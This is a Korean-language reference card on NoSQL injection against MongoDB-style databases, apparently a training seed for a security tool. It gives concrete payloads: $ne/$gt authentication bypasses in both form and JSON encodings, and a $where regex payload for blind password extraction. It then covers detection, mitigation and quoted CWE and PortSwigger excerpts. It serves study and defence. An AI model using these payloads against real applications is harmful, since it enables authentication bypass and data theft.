# 학습 시드(심화): nosql-injection

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn nosql-injection`. P1: 머신별 라이트업 미참조.

## 개요
NoSQL 주입(MongoDB 등): 쿼리 연산자·JS 평가 주입으로 인증우회·데이터유출. 문서형 DB 특성상 연산자 객체가 위험.

## 핵심 기법 · 열거
- 인증우회: {"user":"admin","pass":{"$ne":null}} 또는 {"$gt":""}
- 연산자 주입: $where(JS 실행)·$regex(블라인드 추출)·$gt/$lt
- JSON vs URL 인코딩 차이 악용(username[$ne]=1)
- 블라인드: $regex 로 한 글자씩 비밀번호 추출

## 표준 도구 · 명령
```
username[$ne]=1&password[$ne]=1             # 폼 인증우회
{"username":"admin","password":{"$ne":null}}  # JSON 바디
{"$where":"this.password.match(/^a/)"}   # 블라인드 regex
nosqlmap / 수동 Burp Intruder 로 $regex 브루트
```

## 블루팀 탐지
입력에 $연산자·대괄호 파라미터([$ne])·JS 구문 포함 요청 탐지. 애플리케이션 로그의 비정상 쿼리 객체.

## 완화
입력 타입 검증(문자열 강제)·연산자 키 거부·$where 비활성·ODM 스키마 검증.

- 출처(검증): https://portswigger.net/web-security/nosql-injection

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### CWE-943 Data Query Injection
- 출처: https://cwe.mitre.org/data/definitions/943.html
- 승격일: 2026-10-07
- 요약: CWE-943: Improper Neutralization of Special Elements in Data Query Logic — The product generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query. Extended Description Depending on the capabilities of the query language, an attacker could inject additional logic into the query to: Modify the intended selection criteria, thus changing which data e

### PortSwigger NoSQL Injection
- 출처: https://portswigger.net/web-security/nosql-injection
- 승격일: 2026-10-07
- 요약: NoSQL injection NoSQL injection is a vulnerability where an attacker is able to interfere with the queries that an application makes to a NoSQL database. NoSQL injection may enable an attacker to: Bypass authentication or protection mechanisms. Extract or edit data. Cause a denial of service. Execute code on the server. NoSQL databases store and retrieve data in a format other than traditional SQL relational tables. They use a wide range of query languages instead of a universal standard like SQ
